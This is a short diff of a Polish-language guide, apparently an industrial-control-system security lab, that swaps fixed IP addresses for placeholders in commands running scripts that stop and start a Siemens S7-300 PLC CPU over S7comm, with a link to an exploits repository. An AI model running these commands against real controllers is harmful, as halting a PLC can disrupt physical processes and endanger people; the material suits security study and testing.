@@ -161,11 +161,11 @@ less <file>
 4. Wykonać żądanie sterowania CPU S7comm
 ```
 cd S7_scripts
-python2 s7300stop.py 172.16.132.4
+python2 s7300stop.py <S7-300 IP>
 ```
 Ponadto można spróbować uruchomić komunikat startowy CPU:
 ```
-python2 s7300cpustart.py 172.16.132.2
+python2 s7300cpustart.py <S7-300 IP>
 ```
 
 Odnośnik: [exploits source](https://github.com/hackerhouse-opensource/exploits)
